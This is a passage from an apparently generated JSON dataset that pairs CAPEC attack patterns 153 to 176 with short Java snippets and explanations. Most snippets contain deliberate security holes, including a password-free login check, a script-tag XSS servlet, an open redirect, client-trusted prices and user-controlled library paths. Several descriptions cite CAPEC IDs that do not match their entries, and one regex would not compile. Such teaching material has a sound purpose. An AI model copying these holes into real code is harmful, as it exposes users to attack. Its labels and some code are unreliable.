        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class IdentitySpoofingExample {\n    private static Map<String, String> userDatabase = new HashMap<>();\n\n    static {\n        // Pre-populated user database with username and password\n        userDatabase.put(\"user1\", \"password1\");\n        userDatabase.put(\"user2\", \"password2\");\n    }\n\n    public static boolean authenticate(String username, String password) {\n        // Weak authentication: only checks if the username exists\n        if (userDatabase.containsKey(username)) {\n            return true;\n        }\n        return false;\n    }\n\n    public static void main(String[] args) {\n        String username = \"user1\";\n        String password = \"wrongpassword\";\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Authentication successful for user: \" + username);\n        } else {\n            System.out.println(\"Authentication failed for user: \" + username);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a weak authentication mechanism that is vulnerable to identity spoofing. The `authenticate` method only checks if the username exists in the user database, without verifying the password. This represents CWE-287 (Improper Authentication) and CWE-1390 (Weak Authentication), as the system does not sufficiently prove that the claimed identity is correct. An attacker can easily bypass authentication by providing any existing username, regardless of the password, leading to potential identity spoofing."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "import java.util.Scanner;\n\npublic class InputValidationExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your age: \");\n        String input = scanner.nextLine();\n\n        // Vulnerable code: Improper validation of input\n        if (input.matches(\"\\d+\")) { // Only checks if input is numeric\n            int age = Integer.parseInt(input);\n            if (age >= 18) {\n                System.out.println(\"Access granted.\");\n            } else {\n                System.out.println(\"Access denied. You must be at least 18 years old.\");\n            }\n        } else {\n            System.out.println(\"Invalid input. Please enter a valid age.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple input validation scenario where a user is prompted to enter their age. The code checks if the input is numeric using a regular expression, but it does not validate the input thoroughly. This can be exploited by an attacker who might input a large number or a negative number, which could lead to unexpected behavior or security issues. The code embodies the main idea of CAPEC-126: 'Input Data Manipulation' by showing how improper input validation (CWE-20, CWE-1286, CWE-1287) can lead to security vulnerabilities. The reliance on untrusted input (CWE-807) and improper use of validation frameworks (CWE-1173) are also highlighted as the code does not use any robust validation mechanisms."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class ResourceLocationSpoofingExample {\n    public static void main(String[] args) {\n        try {\n            // Vulnerable URL, could be spoofed\n            String urlString = \"http://trusted-site.com/resource\";\n            URL url = new URL(urlString);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            // Improper verification of the source\n            if (conn.getResponseCode() == 200) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                String inputLine;\n                StringBuilder content = new StringBuilder();\n                while ((inputLine = in.readLine()) != null) {\n                    content.append(inputLine);\n                }\n                in.close();\n                System.out.println(\"Resource content: \" + content.toString());\n            } else {\n                System.out.println(\"Failed to fetch resource\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of resource location spoofing. The code attempts to fetch a resource from a URL without properly verifying the source or destination. This can be exploited by an attacker to redirect the request to a malicious resource. The code does not check if the URL has been tampered with or if the response is from a trusted source, making it vulnerable to spoofing attacks. This example embodies the main idea of CAPEC-111 (Resource Location Spoofing) and is related to CWEs such as CWE-451 (UI Misrepresentation of Critical Information), CWE-941 (Incorrectly Specified Destination in a Communication Channel), and CWE-940 (Improper Verification of Source of a Communication Channel)."
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.PosixFilePermission;\nimport java.nio.file.attribute.PosixFilePermissions;\nimport java.util.Set;\n\npublic class InsecureTempFileExample {\n    public static void main(String[] args) {\n        try {\n            // Create a temporary file in the default temporary-file directory\n            File tempFile = File.createTempFile(\"tempData\", \".txt\");\n\n            // Write sensitive information to the temporary file\n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(\"Sensitive Information: User Passwords\");\n            writer.close();\n\n            // Set insecure permissions (readable by others)\n            Set<PosixFilePermission> perms = PosixFilePermissions.fromString(\"rw-r--r--\");\n            Files.setPosixFilePermissions(Paths.get(tempFile.getAbsolutePath()), perms);\n\n            System.out.println(\"Temporary file created at: \" + tempFile.getAbsolutePath());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the creation and use of an insecure temporary file, embodying the main idea of the CAPEC 'Screen Temporary Files for Sensitive Information'. The code creates a temporary file, writes sensitive information to it, and sets insecure permissions (readable by others). This example highlights the vulnerabilities described in the related CWEs, such as creating temporary files with insecure permissions (CWE-378), storing sensitive data in temporary files (CWE-377), and using a cache that contains sensitive information (CWE-524). An adversary could exploit these weaknesses to access sensitive information stored in the temporary file."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class SniffingAttackExample {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"example.com\", 80);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            String sensitiveData = \"username=admin&password=12345\";\n            out.println(\"POST /login HTTP/1.1\");\n            out.println(\"Host: example.com\");\n            out.println(\"Content-Type: application/x-www-form-urlencoded\");\n            out.println(\"Content-Length: \" + sensitiveData.length());\n            out.println();\n            out.println(sensitiveData);\n\n            // Read response (not checking integrity, CWE-924)\n            String responseLine;\n            while ((responseLine = in.readLine()) != null) {\n                System.out.println(responseLine);\n            }\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a network communication where sensitive information is transmitted in cleartext, making it vulnerable to sniffing attacks. The code connects to a server (example.com) over an unencrypted channel (HTTP on port 80) and sends sensitive data (username and password) in cleartext. This embodies CWE-319 (Cleartext Transmission of Sensitive Information). Additionally, the code does not verify the integrity of the response, which relates to CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel). This example highlights the risks associated with transmitting sensitive information without encryption, making it susceptible to interception by unauthorized actors."
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String receivedData = in.readLine();\n            System.out.println(\"Received: \" + receivedData);\n\n            // Echo the received data back to the client\n            out.println(receivedData);\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple server that listens on port 8080 and echoes back any data it receives from a client. The server reads data from the client in cleartext and prints it to the console, then sends the same data back to the client. This code embodies the main idea of the CAPEC 'Sniffing Network Traffic' by demonstrating how sensitive information can be transmitted in cleartext (CWE-319), making it susceptible to being captured by an adversary monitoring the network. Additionally, the lack of encryption (CWE-311) and potential for replay attacks (CWE-294) are highlighted, as the server does not implement any security measures to protect the transmitted data."
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\n\npublic class LibraryLoader {\n    public static void main(String[] args) {\n        String userSuppliedPath = args[0]; // CWE-73: External Control of File Name or Path\n        loadLibrary(userSuppliedPath);\n    }\n\n    public static void loadLibrary(String path) {\n        try {\n            // CWE-427: Uncontrolled Search Path Element\n            System.setProperty(\"java.library.path\", path);\n            // CWE-706: Use of Incorrectly-Resolved Name or Reference\n            System.loadLibrary(\"maliciousLibrary\");\n        } catch (UnsatisfiedLinkError e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an application loads a library from a user-supplied path. The main idea of the CAPEC is represented by allowing an adversary to redirect the application's attempts to access libraries to a path they control, potentially leading to the execution of unauthorized code. The code takes a path from user input (CWE-73) and sets it as the library path (CWE-427). It then attempts to load a library named 'maliciousLibrary' (CWE-706), which could be a malicious library supplied by an attacker. This demonstrates how an attacker could exploit the application's search path to execute arbitrary code."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String script = request.getParameter(\"script\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<script>\" + script + \"</script>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability where user input is directly embedded into a web page without proper validation or neutralization. The 'script' parameter from the HTTP request is included in the response within a <script> tag, which can lead to Cross-Site Scripting (XSS) attacks. This example embodies the CAPEC concept of 'Exploit Script-Based APIs' by allowing an attacker to inject and execute arbitrary scripts in the context of the web page. The related CWEs are represented as follows: CWE-79 (Cross-site Scripting) is directly demonstrated by the lack of input neutralization, CWE-346 (Origin Validation Error) is implied as the source of the script is not validated, and CWE-81 (Improper Neutralization of Script in an Error Message Web Page) is conceptually similar as it involves improper handling of scripts in web content."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableNetworkCommunication {\n    public static void main(String[] args) {\n        try {\n            String targetUrl = \"http://example.com/api/data\"; // CWE-941: Incorrectly Specified Destination\n            URL url = new URL(targetUrl);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n            // No validation of the endpoint's identity\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                String inputLine;\n                StringBuffer response = new StringBuffer();\n\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n\n                // CWE-924: Improper Enforcement of Message Integrity During Transmission\n                // No integrity check on the received message\n\n                System.out.println(\"Response: \" + response.toString());\n            } else {\n                System.out.println(\"GET request failed\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable network communication scenario. The code attempts to connect to a specified URL and retrieve data without properly validating the endpoint's identity (CWE-923) or ensuring the integrity of the received message (CWE-924). Additionally, the destination URL is hardcoded and may be incorrect (CWE-941). This setup can be exploited by an attacker to manipulate the infrastructure, redirecting the communication to a malicious server, potentially leading to sensitive information exposure (CWE-497). The code embodies the main idea of CAPEC-225 (Infrastructure Manipulation) by showing how improper handling of network communication can be exploited."
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/purchase\")\npublic class PurchaseServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // Vulnerable code: trusting client-side hidden fields\n        String itemId = request.getParameter(\"itemId\");\n        String quantity = request.getParameter(\"quantity\");\n        String price = request.getParameter(\"price\"); // Hidden field\n\n        // Calculate total cost based on client-provided price\n        double totalCost = Double.parseDouble(price) * Integer.parseInt(quantity);\n\n        // Process the purchase\n        processPurchase(itemId, quantity, totalCost);\n\n        response.getWriter().write(\"Purchase successful. Total cost: \" + totalCost);\n    }\n\n    private void processPurchase(String itemId, String quantity, double totalCost) {\n        // Simulate purchase processing\n        System.out.println(\"Processing purchase for item \" + itemId + \" with quantity \" + quantity + \" and total cost \" + totalCost);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability where the server trusts client-side hidden fields for price information. The 'price' parameter is taken directly from the client's request without validation, allowing an attacker to manipulate the price and submit a lower value. This embodies the CAPEC 'Manipulating Hidden Fields' and is related to CWEs such as 'Client-Side Enforcement of Server-Side Security' (CWE-602), 'Reliance on Untrusted Inputs in a Security Decision' (CWE-807), and 'External Control of Assumed-Immutable Web Parameter' (CWE-472). The code calculates the total cost based on the manipulated price, leading to potential financial loss for the merchant."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/redirect\")\npublic class OpenRedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String targetUrl = request.getParameter(\"url\");\n        if (targetUrl != null && !targetUrl.isEmpty()) {\n            // CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n            response.sendRedirect(targetUrl);\n        } else {\n            response.getWriter().write(\"Invalid URL\");\n        }\n    }\n}\n\n@WebServlet(\"/phishingEmail\")\npublic class PhishingEmailServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String emailContent = request.getParameter(\"emailContent\");\n        String recipient = request.getParameter(\"recipient\");\n        // CWE-451: User Interface (UI) Misrepresentation of Critical Information\n        // CWE-1022: Use of Web Link to Untrusted Target with window.opener Access\n        String phishingLink = \"http://untrusted-site.com?target=\" + recipient;\n        emailContent = emailContent.replace(\"{{phishingLink}}\", phishingLink);\n        // Simulate sending email\n        System.out.println(\"Sending email to \" + recipient + \" with content: \" + emailContent);\n    }\n}",
        "description": "The provided Java code snippet demonstrates a web application vulnerable to spear phishing attacks by incorporating several related CWEs. The `OpenRedirectServlet` class contains a method that performs an open redirect based on user input, which is a common vulnerability (CWE-601). The `PhishingEmailServlet` class simulates sending a phishing email by embedding a malicious link into the email content, which misrepresents critical information (CWE-451) and uses a web link to an untrusted target (CWE-1022). This code represents the main idea of spear phishing by showing how an attacker can craft a targeted phishing email with a malicious link, leveraging vulnerabilities to deceive the user."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "import java.util.Scanner;\n\npublic class MobilePhishingExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"You have received a new message: 'Your account has been compromised. Please visit http://fakebank.com to secure your account.'\");\n        System.out.print(\"Enter the URL you want to visit: \");\n        String url = scanner.nextLine();\n\n        if (url.equals(\"http://fakebank.com\")) {\n            System.out.print(\"Enter your username: \");\n            String username = scanner.nextLine();\n            System.out.print(\"Enter your password: \");\n            String password = scanner.nextLine();\n\n            // Simulate sending credentials to the attacker\n            System.out.println(\"Sending credentials to attacker...\");\n            sendCredentialsToAttacker(username, password);\n        } else {\n            System.out.println(\"URL not recognized. Exiting.\");\n        }\n    }\n\n    private static void sendCredentialsToAttacker(String username, String password) {\n        // In a real attack, this would send the credentials to the attacker's server\n        System.out.println(\"Username: \" + username);\n        System.out.println(\"Password: \" + password);\n    }\n}",
        "description": "This Java code snippet simulates a mobile phishing attack. The user receives a fake message prompting them to visit a malicious URL. If the user enters the URL, they are asked for their username and password, which are then 'sent' to the attacker. This example highlights the vulnerability of users to phishing attacks initiated via SMS, as described in the CAPEC. The code also touches on related CWEs, such as UI misrepresentation (CWE-451) by displaying a misleading message, and the use of single-factor authentication (CWE-308) by only asking for a username and password."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"fileName\");\n        Part filePart = request.getPart(\"file\");\n        String filePath = \"/uploads/\" + fileName;\n\n        // CWE-22: Path Traversal\n        if (fileName.contains(\"..\")) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid file name\");\n            return;\n        }\n\n        // CWE-73: External Control of File Name or Path\n        File file = new File(filePath);\n        try (InputStream fileContent = filePart.getInputStream(); FileOutputStream fos = new FileOutputStream(file)) {\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = fileContent.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n        }\n\n        // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n        if (fileName.endsWith(\".exe\")) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Executable files are not allowed\");\n            return;\n        }\n\n        response.getWriter().println(\"File uploaded successfully\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable file upload functionality that embodies the main idea of the CAPEC 'File Manipulation' attack. The code allows users to upload files to the server, but it contains several weaknesses:\n\n1. CWE-22 (Path Traversal): The code attempts to prevent path traversal by checking for '..' in the file name, but this check is insufficient and can be bypassed.\n2. CWE-73 (External Control of File Name or Path): The file name and path are directly influenced by user input, allowing potential manipulation.\n3. CWE-646 (Reliance on File Name or Extension of Externally-Supplied File): The code relies on the file extension to determine if the file is executable, which can be easily spoofed by an attacker.\n\nThe code represents the main idea of the CAPEC by showing how improper handling of file names and paths can lead to vulnerabilities such as path traversal, arbitrary file upload, and execution of malicious files."
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "public class SystemResetExample {\n    private static boolean isAuthenticated = false;\n    private static int securitySetting = 1; // 1 means secure, 0 means insecure\n\n    public static void main(String[] args) {\n        // Simulate a power state transition\n        powerStateTransition();\n\n        // Attempt to reset system values\n        resetSystemValues();\n\n        // Check security setting after reset\n        if (securitySetting == 0) {\n            System.out.println(\"Security setting is insecure after reset!\");\n        } else {\n            System.out.println(\"Security setting is secure.\");\n        }\n    }\n\n    private static void powerStateTransition() {\n        // Simulate entering a low power state and waking up\n        System.out.println(\"Entering low power state...\");\n        System.out.println(\"Waking up from low power state...\");\n        // Improperly preserved integrity of hardware configuration state\n        securitySetting = 0; // Security setting becomes insecure\n    }\n\n    private static void resetSystemValues() {\n        if (!isAuthenticated) {\n            // Missing authentication for critical function\n            System.out.println(\"Resetting system values without authentication...\");\n            securitySetting = 0; // Reset security setting to insecure value\n        } else {\n            System.out.println(\"Authenticated user resetting system values...\");\n            securitySetting = 1; // Reset security setting to secure value\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker can force the system to reset values, leveraging potential weaknesses in the target dependent upon a prior configuration or state-dependent factors. The code simulates a power state transition that improperly preserves the integrity of the hardware configuration state, setting a security-critical setting to an insecure value. Additionally, the resetSystemValues method lacks proper authentication, allowing an unauthenticated user to reset critical system values, further compromising security. This embodies the main idea of the CAPEC 'Force the System to Reset Values' and incorporates related CWEs such as missing authentication for critical functions and improper preservation of hardware configuration state."
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class SensitiveDataLogger {\n    private static final String TRACE_FILE_PATH = \"/tmp/trace.log\";\n\n    public static void main(String[] args) {\n        try {\n            logSensitiveData(\"Sensitive system information: User credentials\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void logSensitiveData(String data) throws IOException {\n        File traceFile = new File(TRACE_FILE_PATH);\n        try (FileWriter writer = new FileWriter(traceFile, true)) {\n            writer.write(data + \"\\n\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the CAPEC 'White Box Reverse Engineering' and associated CWEs. The code logs sensitive system information (e.g., user credentials) to an unprotected file located at '/tmp/trace.log'. This represents CWE-1323 (Improper Management of Sensitive Trace Data) as the trace data is stored in an unprotected location. Additionally, it exposes sensitive system information (CWE-497) to unauthorized control spheres, as the file can be accessed by unauthorized actors. The code snippet embodies the main idea of the CAPEC by showing how sensitive information can be exposed through improper handling and storage, making it susceptible to reverse engineering and unauthorized access."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class ADSExample {\n    public static void main(String[] args) {\n        String filePath = \"example.txt\";\n        String adsPath = filePath + \":hiddenStream\";\n        String data = \"Sensitive data hidden in ADS\";\n\n        try {\n            // Create the main file\n            File file = new File(filePath);\n            if (!file.exists()) {\n                file.createNewFile();\n            }\n\n            // Write data to the alternate data stream\n            FileOutputStream fos = new FileOutputStream(adsPath);\n            fos.write(data.getBytes());\n            fos.close();\n\n            System.out.println(\"Data written to ADS: \" + adsPath);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how to create and write to an Alternate Data Stream (ADS) in a Windows NTFS file system. The main file 'example.txt' is created, and then sensitive data is written to an ADS named 'hiddenStream' associated with this file. This embodies the CAPEC concept of using ADS to hide data, which can be exploited by attackers to store malicious tools or sensitive information without detection by standard file utilities. The code also touches on CWE-212 (Improper Removal of Sensitive Information Before Storage or Transfer) by showing how sensitive data can be hidden in an ADS, and CWE-69 (Improper Handling of Windows ::DATA Alternate Data Stream) by demonstrating the creation and usage of ADS without proper security measures."
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "import java.io.File;\nimport java.io.FileNotFoundException;\nimport java.util.Scanner;\n\npublic class SensitiveInfoExposure {\n    public static void main(String[] args) {\n        File file = new File(\"config.txt\");\n        try {\n            Scanner scanner = new Scanner(file);\n            while (scanner.hasNextLine()) {\n                String line = scanner.nextLine();\n                if (line.contains(\"password\")) {\n                    System.out.println(\"Sensitive information: \" + line);\n                }\n            }\n            scanner.close();\n        } catch (FileNotFoundException e) {\n            System.out.println(\"File not found.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where sensitive information, such as passwords, is exposed to unauthorized actors. The code reads a configuration file ('config.txt') and prints out any lines containing the word 'password'. This represents the CAPEC concept of 'Footprinting', where an adversary probes and explores to identify sensitive information. The code also embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by directly printing sensitive data, and CWE-205 (Observable Behavioral Discrepancy) by revealing internal state information (i.e., the presence of sensitive data) through its output."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerable\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String sensitiveInfo = \"Database connection string: jdbc:mysql://localhost:3306/mydb\";\n        String errorMessage = \"Error: \" + request.getParameter(\"error\");\n        response.getWriter().println(errorMessage);\n        response.getWriter().println(sensitiveInfo);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a web application that is vulnerable to web application fingerprinting. The servlet exposes sensitive system information (CWE-497) by including a database connection string in the response. It also generates an error message containing sensitive information (CWE-209) by directly echoing user input without validation. Additionally, the use of the GET request method with sensitive query strings (CWE-598) is shown by processing the 'error' parameter from the query string. This code represents the main idea of CAPEC-170 by exposing version-dependent and type-dependent behavior that can be used by an attacker to identify the target and formulate a targeted attack plan."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter variable name: \");\n        String varName = scanner.nextLine();\n        System.out.print(\"Enter value: \");\n        String value = scanner.nextLine();\n\n        // Dynamic variable evaluation\n        try {\n            eval(varName + \" = '\" + value + \"'\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    // Simulated eval function\n    public static void eval(String code) throws Exception {\n        // In a real scenario, this would evaluate the code dynamically\n        System.out.println(\"Evaluating: \" + code);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to CAPEC-77: Manipulating User-Controlled Variables, and incorporates CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection'). The code takes user input to dynamically construct and evaluate a variable assignment using a simulated 'eval' function. This represents a security risk as it allows an attacker to inject arbitrary code, leading to potential unauthorized access or manipulation of variables. The 'eval' function here is a placeholder to illustrate the concept, as Java does not have a built-in 'eval' function like some other languages (e.g., JavaScript)."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "import javax.swing.*;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\n\npublic class ActionSpoofingExample {\n    public static void main(String[] args) {\n        JFrame frame = new JFrame(\"Action Spoofing Example\");\n        JButton button = new JButton(\"Submit Query\");\n\n        // Vulnerable ActionListener\n        button.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                // Misleading action: User thinks this submits a query\n                // but it actually downloads a file\n                downloadFile();\n            }\n        });\n\n        frame.getContentPane().add(button);\n        frame.setSize(300, 200);\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        frame.setVisible(true);\n    }\n\n    private static void downloadFile() {\n        // Simulate file download\n        System.out.println(\"File is being downloaded...\");\n    }\n}",
        "description": "This Java code snippet demonstrates an example of Action Spoofing. The user interface (UI) presents a button labeled 'Submit Query', which misleads the user into thinking that clicking the button will submit a query. However, the ActionListener attached to the button actually triggers a file download instead. This embodies the main idea of CAPEC-139 (Action Spoofing) by disguising one action (file download) as another (query submission). The code also touches on CWE-451 (UI Misrepresentation of Critical Information) by presenting misleading information to the user."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class FlashParameterInjectionServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String flashParam = request.getParameter(\"flashParam\");\n        String flashFile = \"<embed src='flashfile.swf?\" + flashParam + \"' />\";\n\n        response.setContentType(\"text/html\");\n        response.getWriter().write(\"<html><body>\" + flashFile + \"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a Flash Parameter Injection vulnerability. The servlet takes a user-supplied parameter 'flashParam' from the HTTP request and directly embeds it into an HTML response without proper validation or sanitization. This allows an attacker to inject malicious global parameters into the Flash file embedded within the HTML document. The code also touches on related CWEs: it does not neutralize special elements (CWE-1336), allows potentially dangerous file types (CWE-434), and could lead to cross-domain policy issues (CWE-942)."
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class CodeInclusionExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java CodeInclusionExample <url>\");\n            return;\n        }\n\n        String url = args[0];\n        try {\n            URL website = new URL(url);\n            BufferedReader in = new BufferedReader(new InputStreamReader(website.openStream()));\n            StringBuilder code = new StringBuilder();\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                code.append(inputLine).append(\"\\n\");\n            }\n            in.close();\n\n            // Simulate code execution\n            System.out.println(\"Executing code from: \" + url);\n            System.out.println(code.toString());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of code inclusion vulnerability. The program takes a URL as an argument, retrieves the content from the specified URL, and simulates the execution of the retrieved code. This embodies the main idea of CAPEC-137 (Code Inclusion) by showing how an adversary could exploit a weakness to force arbitrary code to be retrieved from a remote location and executed. The code does not validate or sanitize the input URL, making it susceptible to CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) and CWE-913 (Improper Control of Dynamically-Managed Code Resources). The code also indirectly touches on CWE-98 (PHP Remote File Inclusion) by demonstrating a similar concept in Java."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
